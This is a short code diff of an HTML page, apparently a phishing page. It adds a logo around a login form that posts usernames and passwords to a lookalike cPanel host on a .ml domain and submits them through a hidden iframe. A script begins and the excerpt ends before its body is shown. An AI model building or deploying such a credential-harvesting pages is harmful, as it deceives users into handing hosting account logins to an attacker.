@@ -1,9 +1,12 @@
-<form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post" target="frame">
-	<p><span>Username: </span><input type="text" name="uname" placeholder="username"></p>
-	<p><span>Password: </span><input type="password" name="passwd" placeholder="password"></p>
-	<input type="hidden" name="submit" value="Login">
-	<input type="submit" value="Login">
-</form>
+<div>
+	<img src="https://cdn.hosting-ssl.ml/image/logo.png">
+	<form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post" target="frame">
+		<p><span>Username: </span><input type="text" name="uname" placeholder="username"></p>
+		<p><span>Password: </span><input type="password" name="passwd" placeholder="password"></p>
+		<input type="hidden" name="submit" value="Login">
+		<input type="submit" value="Login">
+	</form>
+</div>
 <iframe id="frame" name="frame" src="about:blank" style="visibility: hidden;"></iframe>
 <script>
 	var frame = document.getElementById("frame");
